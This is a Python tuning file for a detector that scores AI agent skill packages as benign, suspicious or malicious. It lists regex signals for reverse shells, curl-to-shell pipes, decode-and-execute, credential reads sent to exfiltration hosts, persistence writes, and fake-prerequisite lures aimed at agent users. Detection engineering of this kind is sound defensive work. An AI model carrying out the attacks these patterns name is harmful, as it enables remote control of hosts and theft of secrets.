# -*- coding: utf-8 -*-
"""Central tuning surface for the Track B detection engine.

Every weight, threshold, regex source, AST priority, suppression list and
evidence template lives here. No other module hard-codes tuning values. This is
the ONLY file a tuner needs to edit.

Design rule: signals are BEHAVIOUR classes, never campaign-specific brand
strings. There is deliberately no ``openclaw`` / specific-account / specific-IP
literal anywhere in this engine, so a brand change on the sealed holdout does
not blind the detector.
"""

# --------------------------------------------------------------------------- #
# Verdict thresholds (risk score r is on a 0..100 scale)                       #
# --------------------------------------------------------------------------- #
# r <  BENIGN_MAX            -> benign
# BENIGN_MAX <= r < MAL_MIN  -> suspicious  (the gray zone)
# r >= MAL_MIN               -> malicious
BENIGN_MAX = 20
MAL_MIN = 45

# Bonus when >=2 distinct kill-chain tiers fire together ("the combo is the
# malice"). Encodes that fake-prereq + external host + decode-exec is worse than
# any single piece.
SYNERGY_BONUS = 15
SYNERGY_TIERS = ("A", "B", "C", "D")

# ML fusion: the frozen model only *boosts* recall, it never single-handedly
# convicts. A high ml_score bumps the verdict up by exactly one band.
ML_HIGH = 0.80          # ml_score >= this -> bump one band
ML_VERYHIGH = 0.95      # extreme confidence note only

# Objective used by the threshold sweep in run_selftest (documentation only).
SWEEP_WEIGHTS = {"f2": 0.6, "specificity": 0.3, "gray_handling": 0.1}

# --------------------------------------------------------------------------- #
# Robustness caps                                                              #
# --------------------------------------------------------------------------- #
MAX_FILE_BYTES = 2 * 1024 * 1024        # 2 MiB per file
MAX_SKILL_BYTES = 8 * 1024 * 1024       # 8 MiB across a skill's helper files
MAX_SCAN_CHARS = 600_000                # cap text handed to regex / ml
BINARY_NUL_RATIO = 0.01                 # >1% NUL bytes -> treat as binary

# File extensions we read as text helpers (besides SKILL.md / *.md).
TEXT_HELPER_EXT = (
    ".md", ".markdown", ".txt", ".py", ".js", ".mjs", ".cjs", ".ts", ".sh",
    ".bash", ".zsh", ".ps1", ".psm1", ".rb", ".pl", ".php", ".go", ".rs",
    ".yaml", ".yml", ".json", ".toml", ".ini", ".cfg", ".env", ".bat", ".cmd",
)
# Bundled raw executables / images -> a weak "ships a binary" signal.
BUNDLED_BINARY_EXT = (
    ".exe", ".dll", ".dmg", ".pkg", ".app", ".bin", ".so", ".dylib", ".msi",
    ".scr", ".com", ".jar", ".apk",
)

# --------------------------------------------------------------------------- #
# AST category priority (highest severity first). AST09 (No Governance) is a    #
# policy modifier and is NEVER emitted as a standalone category.                #
# --------------------------------------------------------------------------- #
AST_PRIORITY = [
    "ast01",  # Malicious Skills
    "ast05",  # Unsafe Deserialization
    "ast02",  # Supply Chain
    "ast04",  # Insecure Metadata
    "ast03",  # Over-Privileged
    "ast10",  # Cross-Platform Reuse
    "ast08",  # Poor Scanning (prose-only / zero-width smuggling)
    "ast06",  # Weak Isolation
    "ast07",  # Update Drift
]
# Fallback malicious category when only the ML model fired (no rule signal).
DEFAULT_MALICIOUS_CATEGORY = "ast01"
# Category used when a per-skill internal error forces a conservative verdict.
ERROR_CATEGORY = "ast08"

AST_TITLES = {
    "ast01": "恶意 Skill (Malicious Skills)",
    "ast02": "供应链 (Supply Chain)",
    "ast03": "过度授权 (Over-Privileged Skills)",
    "ast04": "不安全元数据 (Insecure Metadata)",
    "ast05": "不安全反序列化 (Unsafe Deserialization)",
    "ast06": "弱隔离 (Weak Isolation)",
    "ast07": "更新漂移 (Update Drift)",
    "ast08": "弱扫描/隐蔽载荷 (Poor Scanning)",
    "ast10": "跨平台复用 (Cross-Platform Reuse)",
    "benign": "良性 (Benign)",
}

# --------------------------------------------------------------------------- #
# Signal catalogue. Each entry:                                                #
#   id        unique name                                                      #
#   weight    points added to r if fired (counted once per skill)              #
#   tier      A/B/C/D/E/F/L2  (A..D participate in the synergy bonus)          #
#   category  default AST mapping                                              #
#   scope     "all" | "md" | "code"  (which text to scan)                     #
#   kind      "single"  -> pattern                                             #
#             "cooccur" -> pattern_a AND pattern_b within `window` chars        #
#   window    int chars for cooccur, or None = anywhere in the text            #
#                                                                              #
# Patterns are case-insensitive. They describe behaviour classes; the specific  #
# 2026-02 campaign strings are intentionally generalised (paste-host class,     #
# IP-literal class, coercion-phrase class, password-archive class, ...).        #
# --------------------------------------------------------------------------- #
SIGNALS = [
    # ----- Tier A: execution primitives ----------------------------------- #
    # weight 30 (not a "confirmed chain" floor): "curl https://… | bash" is also
    # a legitimate install idiom (uv, rustup, nvm, homebrew). Alone -> suspicious;
    # with a paste-host / fake-prereq corroborator -> malicious via synergy.
    dict(id="S_pipe_to_shell", weight=30, tier="A", category="ast01",
         scope="all", kind="single",
         # require whitespace + an argument after the fetch verb, so a real
         # command (curl https://host/x | bash) matches but the bare prose token
         # "curl|bash" in a tutorial does not.
         pattern=r"(?:curl|wget|fetch|iwr|invoke-webrequest)\s+[^\n|]{1,200}\|\s*"
                 r"(?:sudo\s+)?(?:bash|sh|zsh|dash|python3?|perl|ruby|node|pwsh|powershell)\b"),
    dict(id="S_decode_pipe_shell", weight=42, tier="A", category="ast01",
         scope="all", kind="single",
         pattern=r"(?:base64\s+-{0,2}[dD]\b|base64\s+--decode|openssl\s+enc\s+-d|xxd\s+-r)"
                 r"[^\n]{0,80}\|\s*(?:sudo\s+)?(?:bash|sh|zsh|python3?|perl|ruby)\b"),
    dict(id="S_decode_exec_call", weight=38, tier="A", category="ast01",
         scope="all", kind="cooccur", window=160,
         pattern_a=r"(?:base64\.b64decode|atob\s*\(|frombase64string|convert\.frombase64string|"
                   r"\bunhexlify\b|bytes\.fromhex)",
         pattern_b=r"(?:\beval\s*\(|\bexec\s*\(|os\.system|subprocess\.|child_process|\bspawn\s*\(|"
                   r"\bpopen\b|invoke-expression|\biex\b|new\s+function\s*\()"),
    dict(id="S_reverse_shell", weight=45, tier="A", category="ast01",
         scope="all", kind="single",
         pattern=r"(?:/dev/tcp/|/dev/udp/|nc\s+-[a-z]*e\b|ncat\s+-[a-z]*e\b|"
                 r"bash\s+-i\s*>\s*&|sh\s+-i\s*>\s*&|socat\b[^\n]{0,80}exec|"
                 r"mkfifo[^\n]{0,80}\|\s*(?:nc|ncat)\b|"
                 r"python3?\s+-c\s+['\"][^'\"]{0,40}import\s+socket)"),
    dict(id="S_dynamic_exec", weight=26, tier="A", category="ast01",
         scope="all", kind="cooccur", window=220,
         pattern_a=r"(?:\beval\s*\(|\bexec\s*\(|new\s+function\s*\(|\bcompile\s*\()",
         pattern_b=r"(?:requests\.|urllib|http\.client|fetch\s*\(|socket\.|\.read\s*\(\s*\)|"
                   r"b64decode|atob\s*\(|os\.environ|process\.env)"),

    # ----- Tier B: fake-prerequisite social engineering ------------------- #
    dict(id="S_fake_prereq_phrase", weight=32, tier="B", category="ast01",
         scope="md", kind="cooccur", window=400,
         pattern_a=r"(?:must\s+be\s+running|will\s+not\s+(?:work|function|operate)|"
                   r"won['’]?t\s+(?:work|function)|does\s+not\s+work\s+without|"
                   r"cannot\s+(?:work|function)\s+without|(?:is|are)\s+required\s+(?:for|to)\b|"
                   r"required\s+for\s+the\s+skill|required\s+(?:binary|tool|agent|utility|"
                   r"prerequisite|helper|daemon|cli)|you\s+must\s+(?:first\s+)?(?:download|run|"
                   r"install|execute|launch)|needs?\s+to\s+be\s+(?:installed|running)\s+(?:and|first)|"
                   r"before\s+(?:using|running)\s+this\s+skill|quick\s+setup|set\s*up\s+here)",
         # require an actual downloadable artifact, a raw-script URL, an explicit
         # "setup/download/install … <URL>" call-to-action, or a setup-ish host —
         # NOT the bare words "agent/cli", and NOT a plain reference URL like
         # "see https://python.org" (which legit skills use constantly).
         pattern_b=r"(?:\.zip|\.dmg|\.pkg|\.exe|\.bin|\.tar\.gz|\.7z|\.rar|releases/download|"
                   r"/raw\b|raw=true|"
                   r"(?:setup|download|install|get\s+it|grab|available|click)\s*"
                   r"(?:here|now|it|at|the\s+\w+)?\s*(?:->|→|:|=>)?\s*https?://|"
                   r"https?://[a-z0-9.\-]*(?:forum|installer|setup|cli|agent|cdn|download)[a-z0-9.\-]*)"),
    dict(id="S_external_binary_run", weight=30, tier="B", category="ast01",
         scope="all", kind="cooccur", window=240,
         pattern_a=r"(?:download|fetch|grab|get|obtain)\b[^\n]{0,90}"
                   r"(?:\.zip|\.dmg|\.pkg|\.exe|\.bin|\.tar\.gz|\.7z|\.rar)",
         pattern_b=r"(?:run|execute|launch|double[- ]?click|chmod\s+\+x|\./|open\s+the\s+app|"
                   r"start\s+the\s+(?:agent|binary|tool))"),
    dict(id="S_password_archive", weight=25, tier="B", category="ast01",
         scope="all", kind="cooccur", window=160,
         pattern_a=r"(?:\.zip|\.7z|\.rar|\bunzip\b|\bextract\s+the\s+(?:zip|archive)|"
                   r"\bzip\s+archive\b|\bpassword[- ]protected\s+(?:zip|archive|file))",
         pattern_b=r"(?:password|passcode|pass\s*phrase|pwd)\s*[:=]\s*['\"“「]?[\w@!#.-]{3,}"),

    # ----- Tier C: exfil / external hosting / egress ---------------------- #
    # True anonymous paste / file-drop hosts: suspicious to reference at all.
    dict(id="S_paste_host", weight=24, tier="C", category="ast01",
         scope="all", kind="single",
         pattern=r"(?:glot\.io|rentry\.co|pastebin\.com/raw|hastebin|dpaste|ix\.io|0x0\.st|"
                 r"transfer\.sh|file\.io|anonfiles|gist\.githubusercontent\.com|"
                 r"raw\.githubusercontent\.com/[^\s'\"]+\.(?:sh|ps1|py))"),
    # Generic app-hosting domains (vercel/workers/glitch/repl) are ALSO legit
    # deploy targets -> only suspicious when used as a SCRIPT SOURCE (fetched/run).
    dict(id="S_cloud_script_host", weight=22, tier="C", category="ast01",
         scope="all", kind="cooccur", window=120,
         pattern_a=r"(?:\b[a-z0-9-]+\.glitch\.me\b|\b[a-z0-9-]+\.vercel\.app\b|"
                   r"\b[a-z0-9-]+\.repl\.co\b|\b[a-z0-9-]+\.workers\.dev\b)",
         pattern_b=r"(?:curl|wget|fetch|iwr|invoke-webrequest|\|\s*(?:bash|sh)\b|"
                   r"\.sh\b|download|chmod\s+\+x)"),
    dict(id="S_exfil_endpoint", weight=28, tier="C", category="ast01",
         scope="all", kind="single",
         pattern=r"(?:webhook\.site|requestbin|requestrepo|pipedream\.net|hookbin|beeceptor|"
                 r"\bngrok\.io\b|ngrok-free\.app|burpcollaborator|interactsh|oast\.(?:fun|online|live|pro)|"
                 r"\bdnslog\b|canarytokens)"),
    dict(id="S_ip_literal_url", weight=22, tier="C", category="ast01",
         scope="all", kind="single",
         pattern=r"https?://\d{1,3}(?:\.\d{1,3}){3}(?::\d{1,5})?"),
    dict(id="S_cred_harvest_egress", weight=30, tier="C", category="ast01",
         scope="all", kind="cooccur", window=260,
         pattern_a=r"(?:~/\.aws/credentials|\.ssh/id_[rd]sa|~/\.netrc|\bprintenv\b|os\.environ|"
                   r"process\.env|security\s+find-generic-password|\bkeychain\b|/etc/passwd|"
                   r"\.config/gcloud|ANTHROPIC_API_KEY|OPENAI_API_KEY|AWS_SECRET|AWS_ACCESS_KEY|"
                   r"GITHUB_TOKEN|\bPRIVATE_KEY\b|\bMNEMONIC\b|\bSEED_PHRASE\b)",
         pattern_b=r"(?:curl\s+[^\n]{0,40}-d\b|curl\s+[^\n]{0,40}-F\b|requests\.post|requests\.put|"
                   r"urllib\.request|http\.client|fetch\s*\([^\n]{0,60}(?:method|post)|invoke-restmethod|"
                   r"\.send\s*\(|nc\s+\d|>\s*/dev/tcp)"),
    # POST the OUTPUT of a recon command to a remote host (host fingerprinting /
    # data exfil). Catches "curl --data \"$(uname -a)\" https://host" even when it
    # is not a curl|bash and uses a benign-looking command.
    dict(id="S_cmd_output_exfil", weight=32, tier="C", category="ast01",
         scope="all", kind="single",
         pattern=r"(?:curl|wget|fetch|invoke-restmethod)\b[^\n]{0,160}"
                 r"(?:--data(?:-binary|-raw)?|--data\b|\s-d\s|\s-F\s|-Body)[^\n]{0,80}"
                 r"\$\([^)\n]{0,40}(?:uname|whoami|hostname|\bid\b|printenv|\benv\b|"
                 r"ifconfig|ip\s+a\b|cat\s+/etc|cat\s+~|/etc/passwd|\.ssh|\.aws)"),

    # ----- Tier D: persistence / autorun ---------------------------------- #
    # Co-occurrence: an autostart/persistence LOCATION *plus* an actual payload
    # injection primitive nearby. Legit config/setup skills that merely reference
    # ~/.zshrc or .claude/settings.json (very common) no longer fire.
    dict(id="S_persistence_write", weight=24, tier="D", category="ast01",
         scope="all", kind="cooccur", window=160,
         pattern_a=r"(?:~?/?\.(?:bashrc|zshrc|profile|bash_profile|zprofile)|"
                   r"~/\.ssh/authorized_keys|crontab\s+-|/etc/cron|/var/spool/cron|"
                   r"LaunchAgents/|LaunchDaemons/|/etc/rc\.local|\.config/autostart|"
                   r"HKCU\\[^\n]{0,60}\\Run|HKEY_CURRENT_USER[^\n]{0,60}Run|"
                   r"systemctl\s+--user\s+enable|/etc/systemd/system)",
         pattern_b=r"(?:curl|wget|base64\s+-{0,2}[dD]\b|chmod\s+\+x|/dev/tcp|nc\s+-[a-z]*e|"
                   r"\beval\b|\bexec\b|reverse\s*shell|payload|backdoor|"
                   r"https?://|echo\s+['\"]?[^\n]{0,40}\|\s*(?:bash|sh)\b)"),

    # ----- Tier E: supply chain / metadata / deserialization -------------- #
    dict(id="S_unsafe_deser", weight=22, tier="E", category="ast05",
         scope="all", kind="single",
         pattern=r"(?:yaml\.load\s*\((?![^)\n]*Safe)|!!python/object|!!python/name|"
                 r"\bpickle\.loads?\s*\(|cPickle\.loads|\bmarshal\.loads\b|__reduce__\s*\(|"
                 r"\bphp\s+unserialize\b|ObjectInputStream)"),
    dict(id="S_unpinned_dep", weight=8, tier="E", category="ast02",
         scope="all", kind="single",
         pattern=r"(?:pip\s+install\s+(?!-r\b)(?![^\n]*==)[a-z0-9][a-z0-9_.\-]+|"
                 r"npm\s+i(?:nstall)?\s+(?!-)(?![^\n]*@\d)[a-z0-9@][a-z0-9@/_.\-]+|"
                 r"curl\b[^\n]{0,80}/install\.sh|go\s+install\s+[^\s@]+@latest|"
                 r"gem\s+install\s+[a-z])"),
    dict(id="S_impersonation", weight=14, tier="E", category="ast04",
         scope="md", kind="single",
         pattern=r"(?:author|publisher|maintainer|by|vendor|owner)\s*[:=]\s*['\"「]?\s*"
                 r"(?:anthropic|openai|google|microsoft|amazon|aws|official|verified)\b"),

    # ----- Tier F: obfuscation -------------------------------------------- #
    # S_high_entropy_blob and S_zero_width are injected by signals.py from the
    # entropy / normalize layers (not plain regex), see signals.scan().
]

# Weights for the dynamically-injected (non-regex) signals.
DYN_SIGNALS = {
    "S_high_entropy_blob": dict(weight=14, tier="F", category="ast08"),
    "S_zero_width":        dict(weight=22, tier="F", category="ast08"),
    "S_bundled_binary":    dict(weight=18, tier="C", category="ast01"),
    "S_split_logic":       dict(weight=18, tier="L2", category="ast08"),
}

# Core execution/exfil/persistence primitives used to detect "split logic"
# (clean SKILL.md but malicious helper script -> evades prose review, AST08).
PRIMITIVE_PATTERN = (
    r"(?:curl|wget)\b[^\n|]{0,120}\|\s*(?:bash|sh|python3?|perl)\b|"
    r"base64\s+-{0,2}[dD]\b[^\n]{0,80}\||/dev/tcp/|nc\s+-[a-z]*e\b|"
    r"reverse\s*shell|os\.system\s*\(|subprocess\.(?:popen|run|call)|"
    r"requests\.post|webhook\.site|crontab\s+-|authorized_keys"
)

# Entropy blob detection.
ENTROPY_MIN_LEN = 200
ENTROPY_MIN_BITS = 4.5

# --------------------------------------------------------------------------- #
# Suppression (specificity / false-positive control)                           #
# --------------------------------------------------------------------------- #
# Domains that are NOT exfil/paste hosts even though code talks to them.
OFFICIAL_DOMAINS = (
    "api.anthropic.com", "api.openai.com", "pypi.org", "files.pythonhosted.org",
    "registry.npmjs.org", "npmjs.com", "github.com", "api.github.com",
    "googleapis.com", "google.com", "microsoft.com", "amazonaws.com",
    "cloudflare.com", "huggingface.co", "docker.io", "etherscan.io",
)
# DeFi / crypto legitimate context: dampen key/credential signals UNLESS the
# skill also fetches+runs external code.
DEFI_CONTEXT = (
    "binance", "coinbase", "kraken", "etherscan", "web3", "uniswap", "metamask",
    "wallet", "blockchain", "defi", "erc20", "ethereum", "solana", "ledger",
)
DEFI_PENALTY = 15
# Security / forensics tooling context: shell/base64 mentions are analytical.
SECTOOL_CONTEXT = (
    "malware analysis", "reverse engineering", "reverse-engineering", "ctf",
    "capture the flag", "for educational", "sandbox", "honeypot", "yara",
    "incident response", "threat intel", "detection engineering", "blue team",
    "red team exercise", "penetration test authorized",
)
SECTOOL_PENALTY = 15
# Private / loopback IPs that should NOT count as IP-literal exfil.
PRIVATE_IP_PREFIXES = (
    "http://127.", "https://127.", "http://0.0.0.0", "https://0.0.0.0",
    "http://10.", "https://10.", "http://192.168.", "https://192.168.",
    "http://localhost", "https://localhost",
    "http://172.16.", "http://172.17.", "http://172.18.", "http://172.19.",
    "http://172.20.", "http://172.21.", "http://172.22.", "http://172.23.",
    "http://172.24.", "http://172.25.", "http://172.26.", "http://172.27.",
    "http://172.28.", "http://172.29.", "http://172.30.", "http://172.31.",
)
# Tier-A signals so strong that suppression can never drop them below malicious.
# Deliberately EXCLUDES S_pipe_to_shell (legit install idiom) and
# S_persistence_write (legit config skills) — those are now weight-based, so a
# lone occurrence lands in suspicious, not forced-malicious.
CONFIRMED_CHAIN_SIGNALS = (
    "S_reverse_shell", "S_decode_pipe_shell",
    "S_decode_exec_call", "S_cred_harvest_egress", "S_cmd_output_exfil",
)
# Real-infrastructure signals that distinguish actual malware from a security
# tutorial merely quoting payload syntax. If a confirmed primitive fires in an
# analytical (security-tool) context but NONE of these corroborate it, the
# verdict is capped at "suspicious" rather than "malicious".
STRONG_INFRA_SIGNALS = (
    "S_paste_host", "S_cloud_script_host", "S_exfil_endpoint", "S_ip_literal_url",
    "S_persistence_write", "S_cred_harvest_egress", "S_cmd_output_exfil",
    "S_external_binary_run", "S_password_archive", "S_bundled_binary",
    "S_reverse_shell",
)

# --------------------------------------------------------------------------- #
# Evidence templates (Chinese). {snip} is the real matched substring, quoted.   #
# --------------------------------------------------------------------------- #
EVIDENCE_TEMPLATES = {
    "S_pipe_to_shell":
        "从外部地址拉取脚本并直接管道执行（{snip}），属典型远程代码执行（RCE）模式。",
    "S_decode_pipe_shell":
        "对编码内容解码后直接交给 shell 执行（{snip}），用于隐藏并运行恶意命令。",
    "S_decode_exec_call":
        "在代码中解码字符串后动态执行（{snip}），属混淆载荷执行。",
    "S_reverse_shell":
        "包含反弹 shell / 远程交互式连接特征（{snip}），可被远程控制主机。",
    "S_dynamic_exec":
        "将网络或解码来源的数据传入动态执行函数（{snip}），存在远程代码执行风险。",
    "S_fake_prereq_phrase":
        "以“必须先安装/运行某前置程序，否则无法工作”的话术（{snip}）制造虚假依赖，诱导下载执行外部程序。",
    "S_external_binary_run":
        "指示下载外部压缩包/可执行文件并运行（{snip}），属诱导执行外部二进制。",
    "S_password_archive":
        "引用密码保护的压缩包及其口令（{snip}），常用于规避自动扫描后再解压执行。",
    "S_paste_host":
        "脚本/载荷托管于匿名粘贴或临时托管服务（{snip}），是常见的恶意分发渠道。",
    "S_cloud_script_host":
        "从通用云托管域名拉取并执行脚本（{snip}），被用作载荷分发源。",
    "S_exfil_endpoint":
        "向外联回连/外泄端点发送数据（{snip}），疑似数据外泄或 C2 通道。",
    "S_ip_literal_url":
        "直接使用 IP 地址 URL（{snip}），规避域名信誉检测，疑似外联可疑主机。",
    "S_cred_harvest_egress":
        "读取凭据/环境变量/密钥并配合网络发送（{snip}），疑似凭据窃取与外泄。",
    "S_cmd_output_exfil":
        "将主机侦察命令的输出通过网络外发（{snip}），疑似主机指纹采集与数据外泄。",
    "S_persistence_write":
        "向自启动/持久化位置写入（{snip}），可在卸载后维持驻留。",
    "S_unsafe_deser":
        "使用不安全的反序列化/对象加载（{snip}），可在加载时触发任意代码执行。",
    "S_unpinned_dep":
        "存在未固定版本的依赖安装（{snip}），供应链与更新漂移风险。",
    "S_impersonation":
        "元数据声称由知名官方实体发布（{snip}），疑似品牌冒充。",
    "S_high_entropy_blob":
        "包含超长高熵编码块（{snip}），疑似隐藏的混淆载荷。",
    "S_zero_width":
        "正文中检测到零宽/双向控制等不可见字符，疑似 prose 隐写或指令走私。",
    "S_bundled_binary":
        "随 Skill 直接捆绑了可执行二进制（{snip}），无法静态审查其行为。",
    "S_split_logic":
        "SKILL.md 文档表述无害，但辅助脚本中藏有执行/外联原语（{snip}），疑似规避文档审查的分离式载荷。",
}
GENERIC_POSITIVE_TEMPLATE = "命中可疑行为特征（{snip}）。"

# Verdict framing clauses.
FRAME_MALICIOUS = "判定为恶意：检测到可复现的有害行为指标。"
FRAME_SUSPICIOUS = "判定为可疑：存在中等强度或模糊的风险指标，建议人工复核。"
FRAME_BENIGN_CLEAN = "判定为良性：未发现明确的恶意文件访问、外联或诱导执行行为。"
FRAME_BENIGN_WEAK = "判定为良性：仅有个别弱信号，未构成有害行为证据。"

CHAIN_NOTE = "上述信号跨越多个攻击环节，构成完整的“诱导/下载 + 外部托管 + 解码执行”链路。"
ML_NOTE = "文本统计模型亦判定其行为词分布与已知恶意样本高度相近。"
SUPPRESS_DEFI_NOTE = "样本具备加密/DeFi 合理业务语境，相关密钥用法已降权处理。"
SUPPRESS_SECTOOL_NOTE = "样本自述为安全分析/取证用途，相关 shell/base64 用法判为分析行为并降权。"
ERROR_EVIDENCE = "分析过程中发生内部错误，无法完成完整判定，保守标记为可疑（需人工复核）。"
EMPTY_EVIDENCE = "Skill 内容为空或缺失，未发现可分析的有害行为。"

# Hard cap on evidence length (characters).
EVIDENCE_MAX_CHARS = 400
SNIPPET_MAX_CHARS = 80
